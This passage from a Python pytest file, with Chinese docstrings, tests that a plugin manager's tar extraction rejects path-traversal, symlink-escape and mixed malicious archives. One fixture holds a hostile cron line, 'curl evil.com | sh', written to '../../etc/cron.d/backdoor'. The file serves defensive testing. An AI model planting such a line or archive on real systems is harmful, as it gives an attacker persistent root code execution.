        tar_file = tmp_path / "abs.tar.gz"
        tar_file.write_bytes(tar_bytes)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        # Act & Assert
        with tarfile.open(tar_file, "r:gz") as tar:
            with pytest.raises(ValueError, match="路径穿越"):
                BaseMetricPluginManager._safe_tar_extract(tar, extract_dir)

    def test_rejects_archive_with_mixed_valid_and_malicious_members(self, tmp_path: Path):
        """混合归档（部分合法 + 部分恶意）应整体被拒绝，合法文件也不应被解压。

        攻击者常将恶意成员隐藏在大量合法成员中间，安全校验必须遍历全部成员后再解压。
        """
        # Arrange
        tar_bytes = _make_tar_bytes(
            [
                ("plugin/VERSION", b"1.0.0"),
                ("plugin/info/meta.yaml", b"plugin_id: test"),
                ("../../etc/cron.d/backdoor", b"* * * * * root curl evil.com | sh"),
            ]
        )
        tar_file = tmp_path / "mixed.tar.gz"
        tar_file.write_bytes(tar_bytes)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        # Act & Assert
        with tarfile.open(tar_file, "r:gz") as tar:
            with pytest.raises(ValueError, match="路径穿越"):
                BaseMetricPluginManager._safe_tar_extract(tar, extract_dir)

        assert not (extract_dir / "plugin").exists(), "恶意归档被拒绝后，合法文件也不应被写入"

    def test_rejects_symlink_based_traversal(self, tmp_path: Path):
        """通过符号链接间接实现的路径穿越应被拒绝。

        攻击手法：先创建指向 .. 的符号链接 escape，再通过 escape/target 写入上层目录。
        """
        # Arrange
        tar_bytes = _make_tar_bytes_with_symlink(
            members=[("escape/target.txt", b"escaped content")],
            symlinks=[("escape", "..")],
        )
        tar_file = tmp_path / "symlink.tar.gz"
        tar_file.write_bytes(tar_bytes)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        # Act & Assert
        with tarfile.open(tar_file, "r:gz") as tar:
            with pytest.raises(ValueError, match="路径穿越"):
                BaseMetricPluginManager._safe_tar_extract(tar, extract_dir)

    def test_extract_package_uses_safe_extraction(self, tmp_path: Path):
        """集成测试：_extract_package 应使用 _safe_tar_extract，恶意归档无法解压。"""
        # Arrange
        tar_bytes = _make_tar_bytes([("../../etc/evil", b"payload")])
        tar_file = tmp_path / "evil_package.tar.gz"
        tar_file.write_bytes(tar_bytes)

        # Act & Assert
        with pytest.raises(ValueError, match="路径穿越"):
            BaseMetricPluginManager._extract_package(tar_file)

    def test_extract_package_normal_archive_succeeds(self, tmp_path: Path):
        """集成测试：_extract_package 应能正常解压合法的 tar.gz 包。"""
        # Arrange
        tar_bytes = _make_tar_bytes(
            [
                ("external_plugins_linux_x86_64/test_plugin/VERSION", b"1.0.0"),
            ]
        )
        tar_file = tmp_path / "good_package.tar.gz"
        tar_file.write_bytes(tar_bytes)

        # Act
        extract_dir = BaseMetricPluginManager._extract_package(tar_file)

        # Assert
        try:
            version_file = extract_dir / "external_plugins_linux_x86_64" / "test_plugin" / "VERSION"
            assert version_file.exists()
            assert version_file.read_text() == "1.0.0"
        finally:
            import shutil

            shutil.rmtree(extract_dir, ignore_errors=True)

    def test_empty_archive_extracts_without_error(self, tmp_path: Path):
        """空归档（无成员）应正常解压而不报错。"""
        # Arrange
        tar_bytes = _make_tar_bytes([])
        tar_file = tmp_path / "empty.tar.gz"
        tar_file.write_bytes(tar_bytes)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        # Act — 不应抛出任何异常
        with tarfile.open(tar_file, "r:gz") as tar:
            BaseMetricPluginManager._safe_tar_extract(tar, extract_dir)

        # Assert
        assert not any(extract_dir.iterdir())
